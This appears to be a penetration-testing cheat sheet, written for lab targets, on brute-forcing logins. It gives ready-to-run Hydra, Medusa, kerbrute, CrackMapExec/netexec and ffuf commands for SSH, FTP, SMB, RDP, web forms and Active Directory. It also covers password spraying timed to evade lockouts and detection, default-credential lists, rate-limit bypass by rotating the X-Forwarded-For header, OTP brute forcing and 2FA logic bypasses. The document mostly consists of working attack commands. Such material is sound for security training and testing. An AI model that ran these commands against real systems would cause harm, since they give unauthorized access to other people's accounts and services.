# Login Brute Forcing

#bruteforce #auth #authentication #hydra #medusa #passwords #PasswordSpraying #2FABypass #MFA #kerbrute #netexec #ffuf #UsernameEnumeration

## What is this?

Automated credential testing against authentication interfaces. Covers Hydra and Medusa for protocols (SSH, FTP, SMB, RDP, HTTP forms), wordlist generation (cupp, CeWL), username enumeration via response analysis, and password spraying to avoid account lockouts. Pairs with [[Password Attacks]], [[Web Attacks]].

---

## Tools

| Tool | Purpose |
|---|---|
| [[Tools/Auth/Hydra\|Hydra]] | Multi-protocol online brute forcer — SSH, FTP, SMB, RDP, HTTP |
| [[Tools/Auth/Medusa\|Medusa]] | Multi-threaded parallel brute forcer |
| [[Tools/Lateral Movement/NetExec\|netexec]] / [[Tools/Lateral Movement/crackmapexec\|CrackMapExec]] | SMB/AD password spraying with lockout tracking |
| [[Tools/Scanning/ffuf\|ffuf]] | HTTP form brute force + username enumeration |
| [[Tools/Web/Burpsuite\|Burp Intruder]] | GUI credential stuffing and form fuzzing |
| [[Tools/Wordlists/cupp\|cupp]] | Targeted wordlist generation from personal info |
| [[Tools/Auth/Username Anarchy\|username-anarchy]] | Username permutation from real names |
| [[Tools/Web/CeWL\|CeWL]] | Crawl target site to build custom wordlist |
| [[Tools/Auth/Kerbrute\|kerbrute]] | Kerberos pre-auth username enumeration and brute force — fast, low-noise for AD |

---

## Attack Types

| Method | Description | Best When |
|---|---|---|
| `Dictionary` | Tries passwords from a wordlist | Target likely uses weak/common passwords |
| `Brute Force` | Tries all character combinations | No info available, short passwords |
| `Hybrid` | Wordlist + mutations (append/prepend chars) | Target uses slightly modified common passwords |
| `Password Spraying` | Few passwords × many usernames | Lockout policy in place — avoid detection |
| `Credential Stuffing` | Leaked creds from breaches → other services | Target suspected of password reuse |
| `Rainbow Table` | Pre-computed hash → plaintext lookup | Large number of hashes to crack offline |

---

## Wordlists

| Wordlist | Description |
|---|---|
| `/usr/share/wordlists/rockyou.txt` | ~14M leaked passwords from RockYou breach |
| `/usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt` | Top 200 common passwords |
| `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` | Common usernames (quick) |
| `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` | 10M usernames (thorough) |
| `/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt` | Default device credentials |

---

## Custom Wordlist Generation

### cupp — target-specific password list

```bash
sudo apt install cupp -y
cupp -i        # interactive — prompts for target info (name, DOB, pet, etc.)
```

### Username Anarchy — username permutations

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
./username-anarchy Jane Smith > jane_smith_usernames.txt
./username-anarchy -i /path/to/firstlast_names.txt > usernames.txt
```

### CeWL — scrape keywords from website

```bash
cewl https://www.example.com -d 3 -m 5 -w cewl_wordlist.txt
```

### Filter Wordlist by Password Policy

```bash
# Download base list
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/darkweb2017-top10000.txt

# Apply policy filters. NOTE: never do `grep ... file > file` — the shell truncates
# `file` (via >) BEFORE grep reads it, wiping your list. Pipe, or write a NEW file each step.

# One-liner (safe — piped, no in-place clobber)
grep -E '^.{8,}$' darkweb2017-top10000.txt \
  | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' \
  | grep -E '([!@#$%^&*].*){2,}' > final_wordlist.txt

# Step-by-step alternative — write to a different file each time
grep -E '^.{8,}$' darkweb2017-top10000.txt > f1.txt   # min 8 chars
grep -E '[A-Z]' f1.txt > f2.txt                        # must have uppercase
grep -E '[a-z]' f2.txt > f3.txt                        # must have lowercase
grep -E '[0-9]' f3.txt > final_wordlist.txt            # must have digit
```

---

## Hydra

### Syntax

```bash
hydra -l <user> -p <pass> <target> <service>
hydra -L users.txt -P passwords.txt <target> <service>
```

**Common flags:**

| Flag | Description |
|---|---|
| `-l` | Single username |
| `-L` | Username wordlist |
| `-p` | Single password |
| `-P` | Password wordlist |
| `-C` | Colon-separated `user:pass` list |
| `-s` | Custom port |
| `-t` | Threads (default 16) |
| `-f` | Stop after first valid login |
| `-V` | Verbose — show each attempt |
| `-u` | Loop users before passwords (spray mode) |

### SSH

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.129.x.x
hydra -L users.txt -P passwords.txt ssh://10.129.x.x -t 4
```

### FTP

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://10.129.x.x
```

### SMB

```bash
hydra -L users.txt -P passwords.txt smb://10.129.x.x
```

### RDP

```bash
hydra -L users.txt -P passwords.txt rdp://10.129.x.x -t 4
```

### HTTP Basic Auth

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.x.x http-get /protected/
```

Basic Auth header decoded: `Authorization: Basic YWxpY2U6c2VjcmV0` → `alice:secret` (base64)

### HTTP POST Form

```bash
# Syntax: http-post-form "/path:param1=^USER^&param2=^PASS^:F=<failure_string>"
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.x.x http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"

# With cookie
hydra -l admin -P passwords.txt 10.129.x.x http-post-form "/login:user=^USER^&pass=^PASS^:F=Login failed:H=Cookie: session=abc123"
```

### HTTP GET Form

```bash
hydra -l admin -P passwords.txt 10.129.x.x http-get-form "/login:username=^USER^&password=^PASS^:F=Invalid"
```

### MySQL / MSSQL / PostgreSQL

```bash
hydra -l root -P passwords.txt mysql://10.129.x.x
hydra -l sa -P passwords.txt mssql://10.129.x.x
hydra -l postgres -P passwords.txt postgres://10.129.x.x
```

### Password Spraying (avoid lockouts)

```bash
# -u loops usernames before moving to next password — better for spraying
hydra -L users.txt -P top_passwords.txt 10.129.x.x ssh -u -f
```

---

## Medusa

```bash
# Syntax
medusa -h <host> -u <user> -P <passlist> -M <module>

# SSH
medusa -h 10.129.x.x -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# FTP
medusa -h 10.129.x.x -u admin -P passwords.txt -M ftp

# HTTP Basic Auth (http module: DIR + METHOD are separate -m options)
medusa -h 10.129.x.x -u admin -P passwords.txt -M http -m DIR:/protected/ -m METHOD:GET

# HTTP POST Form (web-form module: FORM = page, FORM-DATA = method?fields, DENY-SIGNAL = failure text)
medusa -h 10.129.x.x -u admin -P passwords.txt -M web-form \
  -m FORM:"login.php" \
  -m FORM-DATA:"post?username=&password=" \
  -m DENY-SIGNAL:"Invalid"

# SMB
medusa -h 10.129.x.x -U users.txt -P passwords.txt -M smbnt
```

**Common flags:**

| Flag | Description |
|---|---|
| `-h` | Target host |
| `-H` | Host file |
| `-u` | Single username |
| `-U` | Username file |
| `-p` | Single password |
| `-P` | Password file |
| `-M` | Module (service) |
| `-m` | Module-specific options |
| `-t` | Threads |
| `-f` | Stop after first success |

---

## Active Directory Attacks

### kerbrute — Kerberos Username Enumeration + Brute Force

Sends AS-REQ packets directly to the DC — no LDAP, no failed login events in the security log for invalid usernames. Valid usernames get a proper KRB error (PRINCIPAL_UNKNOWN vs PASSWORD_WRONG).

```bash
# Install
go install github.com/ropnop/kerbrute@latest
# or: download binary from https://github.com/ropnop/kerbrute/releases

# Username enumeration (no creds needed)
kerbrute userenum -d inlanefreight.htb --dc 172.16.5.5 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Password brute force against single user
kerbrute bruteuser -d inlanefreight.htb --dc 172.16.5.5 /usr/share/wordlists/rockyou.txt administrator

# Password spraying — one password, many users (lockout safe)
kerbrute passwordspray -d inlanefreight.htb --dc 172.16.5.5 users.txt 'Welcome1'

# Output valid users to file
kerbrute userenum -d inlanefreight.htb --dc 172.16.5.5 users.txt -o valid_users.txt
```

> [!note] Kerbrute username enum generates `4768` (TGT requests) in the DC event log but NOT `4625` (failed login) — much quieter than LDAP-based enumeration. Still visible to a tuned SIEM.

### CrackMapExec Password Spraying

Safe AD spraying: one password per lockout observation window across all accounts.

> [!note] CrackMapExec is unmaintained — its successor is **netexec** (`nxc`), a drop-in replacement (`nxc smb …` accepts the same flags). Also `-H` takes hash value(s), not a filename — feed hashes inline (`-H <hash>`) or via a wrapper loop, not `-H file.txt`.

```bash
# Spray one password across all users
crackmapexec smb 172.16.5.5 -u users.txt -p 'Welcome1' --continue-on-success

# Spray multiple targets from a list
crackmapexec smb targets.txt -u users.txt -p 'Spring2024!' --continue-on-success

# Check lockout policy first
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --pass-pol

# Spray with hash (PTH)
crackmapexec smb 172.16.5.5 -u users.txt -H ntlm_hash.txt --continue-on-success

# Local admin spray
crackmapexec smb 172.16.5.0/24 -u administrator -p 'Password123' --local-auth --continue-on-success
```

**Safe spraying strategy:**
1. Enumerate lockout threshold: `crackmapexec smb <DC> -u user -p pass --pass-pol`
2. Set attempts to `threshold - 1` per window (usually spray once every 30-60 min)
3. Use `--continue-on-success` so CME doesn't stop on first hit
4. Track time between sprays — lockout observation window is typically 30 minutes

---

## Default Credentials

```bash
# Try known defaults before brute forcing
# https://github.com/ihebski/DefaultCreds-cheat-sheet
# /usr/share/seclists/Passwords/Default-Credentials/

hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt 10.129.x.x http-get /
```

Common defaults to try manually:

| Service | Common Defaults |
|---|---|
| Routers | `admin:admin`, `admin:password`, `admin:` |
| Tomcat | `tomcat:tomcat`, `admin:admin`, `tomcat:s3cret` |
| Jenkins | `admin:admin`, `admin:password` |
| IPMI | `ADMIN:ADMIN` |
| Printers | `admin:admin`, `admin:1234` |
| MySQL | `root:` (empty), `root:root` |

---

## Web Application Notes

### Identifying Login Failure String

Intercept with Burp or curl to get the failure response, then use that string as the failure indicator in Hydra/Medusa:

```bash
curl -s -X POST http://10.129.x.x/login -d "username=baduser&password=badpass" | grep -i "error\|invalid\|fail"
```

### Rate Limit Bypass via Header Rotation

Some apps rate-limit by IP using headers like `X-Forwarded-For` or `X-Real-IP` rather than the actual source IP. Rotating the header value resets the rate limit counter.

```bash
# Hydra — inject rotating X-Forwarded-For with each attempt
# (Hydra doesn't natively rotate headers — use ffuf instead)

# ffuf — set X-Forwarded-For to FUZZ value alongside password attempt
# Create a numbered IP list first
seq 1 10000 | awk '{print "10.0."int($1/256)"."$1%256}' > fake_ips.txt

# Spray passwords with rotating IP header (use -H with FUZZ in two positions)
ffuf -w passwords.txt:PASS -w fake_ips.txt:IP \
  -X POST -d "username=admin&password=PASS" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Forwarded-For: IP" \
  -u http://10.129.x.x/login -fs <failure_size>

# Other headers to try (some apps check only one)
# X-Forwarded-For
# X-Real-IP
# X-Client-IP
# X-Remote-IP
# X-Originating-IP
# CF-Connecting-IP
```

> [!warning] Only test rate limit bypass on authorized targets. Confirm the app is actually checking these headers before burning time — send a request with `X-Forwarded-For: 1.2.3.4` and check if the response changes.

### OTP / 2FA Brute Force

Short OTP codes (4-6 digits, no rate limit) can be brute forced within a valid session window.

```bash
# Generate all 6-digit OTP candidates
seq -w 000000 999999 > otp_codes.txt

# ffuf — brute force OTP field after successful username+password
# First: log in with valid creds to get a session cookie, then brute the OTP endpoint
ffuf -w otp_codes.txt \
  -X POST -d "otp=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: session=<valid_session_after_pw_step>" \
  -u http://10.129.x.x/verify-otp \
  -fs <failure_size> -t 10

# 4-digit TOTP/PIN (10000 candidates)
seq -w 0000 9999 > pin_codes.txt
```

**What to check before attempting:**
- Is there a rate limit on OTP attempts? (Intentionally send 5-10 wrong codes)
- Does the OTP expire quickly? (TOTP typically 30s — need fast enough thread rate)
- Is the session invalidated after N wrong OTP attempts?
- Does the OTP validation endpoint require the same session that passed the password step?

### 2FA / MFA Logic Bypasses (Try Before Brute Forcing)

Brute-forcing the OTP is the last resort. Most real 2FA failures are logic flaws — the code is validated in a way you can sidestep entirely. Work through these first; each is one request in Burp.

| Bypass | How to test |
|---|---|
| **Drop the OTP parameter** | Complete password step, then send the final request with the `otp`/`code` field removed entirely (not blank — absent). Backends that only validate when the field is present let you straight through. |
| **Force a success response** | Submit a wrong OTP, then in Burp change the response (`{"success":false}` → `true`, `302`→`200`, or vice-versa). If the client trusts the response to redirect, you're in — the check was client-side. |
| **Reuse / no-invalidation** | Use a code you already consumed once. If it still works, codes aren't invalidated on use — capture one and replay it. |
| **OTP for account A, session for B** | Log in as your own account, grab a valid OTP, then submit it against the victim's password-step session. Tests whether the code is bound to the user. |
| **Skip straight to the post-2FA endpoint** | Note the URL you land on after 2FA. Do the password step only, then request that URL directly — many apps set the session as authenticated at the password step and treat 2FA as a separate, unenforced page. |
| **Backup-code / "remember device" path** | The alternate verification flow (backup codes, trusted-device token, SMS-fallback) is often weaker or unthrottled where the primary TOTP path is hardened. |
| **Response/status on enable vs verify** | Some flows leak the correct code in a response body or header during the *enrollment* step — check the enable-2FA response before assuming you must guess. |

```bash
# Drop-the-parameter test — send the final step with NO otp field
curl -s -X POST http://<target>/verify-otp \
  -H "Cookie: session=<post-password-session>" \
  -H "Content-Type: application/x-www-form-urlencoded" -d ""

# Reuse test — replay a code you already used successfully once
curl -s -X POST http://<target>/verify-otp \
  -H "Cookie: session=<fresh-session>" -d "otp=<already-used-code>"
```

> [!note] The dominant real-world MFA bypasses in 2025–26 — **MFA-fatigue push spam** and **AiTM reverse-proxy session theft** (Evilginx, Tycoon 2FA) — steal a *post-authentication session token*, sidestepping the challenge entirely rather than defeating the code. They're phishing/social-engineering plays, outside a login-brute-force note's scope, but they're why "is the session token the real gate?" is the first question to ask. See [[Cross-Site Scripting (XSS)]] / [[CSRF Attacks]] for session-token theft primitives.

### Username Enumeration via Response Differences

- Different HTTP response codes for valid vs invalid users
- Different response times — valid user auth typically takes longer (hash comparison vs early rejection)
- Different error messages ("User not found" vs "Wrong password")

```bash
# If different response length for valid user:
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -d "username=FUZZ&password=wrongpass" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.129.x.x/login -fs <invalid_size>

# Timing-based enumeration — filter by response time (valid users take longer)
# ffuf -t 1 (single thread) for accurate timing comparison
ffuf -w usernames.txt -X POST -d "username=FUZZ&password=wrongpass" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://10.129.x.x/login -t 1 -v 2>&1 | grep -E "FUZZ|time"
# Look for outliers: response times 100-500ms above baseline indicate valid users
```

### Brute Force After Username Enumeration

```bash
ffuf -w passwords.txt -X POST -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.129.x.x/login -fs <failure_size>
```

---

## Quick Reference

```bash
# SSH / FTP single-user
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target>
hydra -l admin -P rockyou.txt ftp://<target>

# HTTP POST form (F = failure string)
hydra -l admin -P pass.txt <target> http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"

# AD username enum (quiet — AS-REQ, no 4625)
kerbrute userenum -d <domain> --dc <dc-ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# AD password spray (lockout-safe: one pw, many users)
nxc smb <dc-ip> -u users.txt -p 'Welcome1' --continue-on-success
kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt 'Welcome1'

# Check lockout policy BEFORE spraying
nxc smb <dc-ip> -u user -p pass --pass-pol

# Web username enum by response size
ffuf -w users.txt -X POST -d "username=FUZZ&password=x" -u http://<target>/login -fs <invalid_size>

# OTP brute (valid session already held)
seq -w 000000 999999 > otp.txt
ffuf -w otp.txt -X POST -d "otp=FUZZ" -H "Cookie: session=<sess>" -u http://<target>/verify-otp -fs <fail_size>

# 2FA logic bypass — try BEFORE brute forcing: send final step with NO otp field
curl -s -X POST http://<target>/verify-otp -H "Cookie: session=<post-pw-sess>" -d ""
# Also: replay a used code, force response true/302, request post-2FA URL directly
```

---

*Created: 2026-02-27*
*Updated: 2026-07-31*
*Model: claude-opus-5*